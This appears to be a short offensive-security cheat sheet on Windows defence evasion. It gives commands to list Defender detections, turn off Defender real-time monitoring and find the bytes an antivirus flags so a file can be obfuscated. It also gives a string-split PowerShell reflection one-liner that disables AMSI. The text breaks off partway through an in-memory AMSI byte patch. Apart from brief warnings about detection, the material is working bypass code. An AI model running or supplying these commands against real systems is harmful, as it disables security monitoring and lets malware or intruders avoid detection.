#detection #evasion #amsi #uac #applocker

# Windows Evasion Techniques

AMSI/UAC/AppLocker/CLM bypasses (offensive). Related: [siem](siem.md) · [privesc](../Windows/privesc.md) · [shells-payloads](../Tools/shells-payloads.md)

## Contents
- [Defender](#defender)
- [AMSI Bypass](#amsi-bypass)
- [UAC Bypass](#uac-bypass)
- [AppLocker](#applocker)

## Defender
```powershell
Get-MpThreat
```
View detected threats (`Get-MpComputerStatus` for status).

> [!WARNING]
> Requires local admin and is highly visible: disabling real-time protection is itself a loggable, high-signal Defender/EDR event.

```powershell
Set-MpPreference -DisableRealTimeMonitoring $true
```
Disable real-time monitoring (admin).

```cmd
ThreatCheck.exe -f .\YourFile.exe
```
Find the exact bytes an AV flags (for obfuscation).

## AMSI Bypass
> [!CAUTION]
> In-memory AMSI patches are well-known to EDR/AV and the byte patch below is offset/version-sensitive — verify against the target's PowerShell/CLR build before use.[^1]

```powershell
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
```
Set `amsiInitFailed` to disable AMSI in-session.

```powershell
$patch = [Byte[]] (0xB8,0x05,0x40,0x00,0x80